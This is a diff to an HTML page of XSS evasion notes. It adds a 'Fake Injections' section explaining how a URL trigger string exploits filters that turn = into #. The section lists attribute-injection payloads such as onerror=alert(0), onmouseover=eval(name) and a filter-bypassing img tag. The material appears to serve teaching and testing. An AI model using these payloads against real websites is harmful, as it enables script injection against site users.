@@ -25,4 +25,28 @@ This inserts a '&lt;base' tag to take over the &lt;a href&gt; link and sets the 
 Then you just need to setup a response on your controlled URL<br/>
 <br/>
 <b>Spell Checker</b><br/>
-Some sites offer spell checking as a feature of their search functionality or translation application. While this might be a good idea from an user perspective, it can also be a bad idea for one who is trying to avoid XSS in his/her code. Developer got a “but report”.</body></html>
+Some sites offer spell checking as a feature of their search functionality or translation application. While this might be a good idea from an user perspective, it can also be a bad idea for one who is trying to avoid XSS in his/her code. Developer got a “but report”.<br/>
+<br/>
+<b>Fake Injections</b><br/>
+Almost any = sign on a webpage can be neutered with a suitable "trigger string"<br/>
+– Easiest candidate is something of the form:<br/>
+– ' * *ANYTHING* . *ANYTHING* =<br/>
+– Start with target equal sign, find previous period, and then previous quote<br/>
+Append trigger string to URL:<br/>
+– &amp;fake='&gt;anything.anything=<br/>
+If site is using filtering and changing = to #, this can allow an attribute value to be parsed as a new name/value<br/>
+Need to control the value of an HTML attribute<br/>
+<br/>
+x style=x:expression(alert(0)) x<br/>
+x/style=x:expression(alert(0));x:<br/>
+x onerror=alert(0) x<br/>
+x/onerror=alert(0)//<br/>
+x onmouseover=location=name x<br/>
+x/onmouseover=location=name//<br/>
+x onmouseover=eval(name) x<br/>
+x/onmouseover=eval(name)//<br/>
+<br/>
+URLs make you vulnerable<br/>
+&lt;img src="http://0x.lv/onerror=alert(1)//"&gt;<br/>
+After filter:<br/>
+&lt;img src#"http: 0x.lv onerror=alert(1)//"&gt;</body></html>
